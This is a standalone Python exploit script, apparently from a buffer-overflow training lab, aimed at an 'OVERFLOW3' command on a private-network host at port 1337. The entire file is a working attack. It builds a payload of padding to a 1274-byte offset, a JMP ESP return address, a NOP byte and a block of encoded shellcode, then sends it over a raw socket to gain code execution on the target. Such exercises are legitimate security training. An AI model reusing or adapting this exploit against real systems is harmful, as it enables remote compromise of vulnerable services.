import socket, struct


host, port = '10.10.60.7', 1337

command = b'OVERFLOW3 '
def p32(data):
        return struct.pack("<I", data)

jmp_esp = p32(0x62501203)

new_eip = b'BBBB'
offset = 1274
length = 1300
all_chars = bytearray(range(1,256))
bad_chars = [
b'\x11',
b'\x40',
b'\x5f',
b'\xb8',
b'\xee'
]
shellcode =  b""
shellcode += b"\xfc\xbb\xa5\x36\xd6\x5c\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x59\xde\x54\x5c\xa1\x1f\x39\xd4"
shellcode += b"\x44\x2e\x79\x82\x0d\x01\x49\xc0\x43\xae\x22"
shellcode += b"\x84\x77\x25\x46\x01\x78\x8e\xed\x77\xb7\x0f"
shellcode += b"\x5d\x4b\xd6\x93\x9c\x98\x38\xad\x6e\xed\x39"
shellcode += b"\xea\x93\x1c\x6b\xa3\xd8\xb3\x9b\xc0\x95\x0f"
shellcode += b"\x10\x9a\x38\x08\xc5\x6b\x3a\x39\x58\xe7\x65"
shellcode += b"\x99\x5b\x24\x1e\x90\x43\x29\x1b\x6a\xf8\x99"
shellcode += b"\xd7\x6d\x28\xd0\x18\xc1\x15\xdc\xea\x1b\x52"
shellcode += b"\xdb\x14\x6e\xaa\x1f\xa8\x69\x69\x5d\x76\xff"
shellcode += b"\x69\xc5\xfd\xa7\x55\xf7\xd2\x3e\x1e\xfb\x9f"
shellcode += b"\x35\x78\x18\x21\x99\xf3\x24\xaa\x1c\xd3\xac"
shellcode += b"\xe8\x3a\xf7\xf5\xab\x23\xae\x53\x1d\x5b\xb0"
shellcode += b"\x3b\xc2\xf9\xbb\xd6\x17\x70\xe6\xbe\xd4\xb9"
shellcode += b"\x18\x3f\x73\xc9\x6b\x0d\xdc\x61\xe3\x3d\x95"
shellcode += b"\xaf\xf4\x42\x8c\x08\x6a\xbd\x2f\x69\xa3\x7a"
shellcode += b"\x7b\x39\xdb\xab\x04\xd2\x1b\x53\xd1\x75\x4b"
shellcode += b"\xfb\x8a\x35\x3b\xbb\x7a\xde\x51\x34\xa4\xfe"
shellcode += b"\x5a\x9e\xcd\x95\xa1\x49\xf8\x62\x9c\xb1\x94"
shellcode += b"\x76\xde\xe2\x4d\xfe\x38\x8e\x9d\x56\x93\x27"
shellcode += b"\x07\xf3\x6f\xd9\xc8\x29\x0a\xd9\x43\xde\xeb"
shellcode += b"\x94\xa3\xab\xff\x41\x44\xe6\x5d\xc7\x5b\xdc"
shellcode += b"\xc9\x8b\xce\xbb\x09\xc5\xf2\x13\x5e\x82\xc5"
shellcode += b"\x6d\x0a\x3e\x7f\xc4\x28\xc3\x19\x2f\xe8\x18"
shellcode += b"\xda\xae\xf1\xed\x66\x95\xe1\x2b\x66\x91\x55"
shellcode += b"\xe4\x31\x4f\x03\x42\xe8\x21\xfd\x1c\x47\xe8"
shellcode += b"\x69\xd8\xab\x2b\xef\xe5\xe1\xdd\x0f\x57\x5c"
shellcode += b"\x98\x30\x58\x08\x2c\x49\x84\xa8\xd3\x80\x0c"
shellcode += b"\xd8\x99\x88\x25\x71\x44\x59\x74\x1c\x77\xb4"
shellcode += b"\xbb\x19\xf4\x3c\x44\xde\xe4\x35\x41\x9a\xa2"
shellcode += b"\xa6\x3b\xb3\x46\xc8\xe8\xb4\x42\xc8\x0e\x4b"
shellcode += b"\x6d"

for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

op_sled = b'\x90'
payload = b''.join([
        command,
        b'A' * offset,
        jmp_esp,
        op_sled,
        shellcode,
        b'C' * (length - offset - len(jmp_esp) - len(op_sled) - len(shellcode)),
])




with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
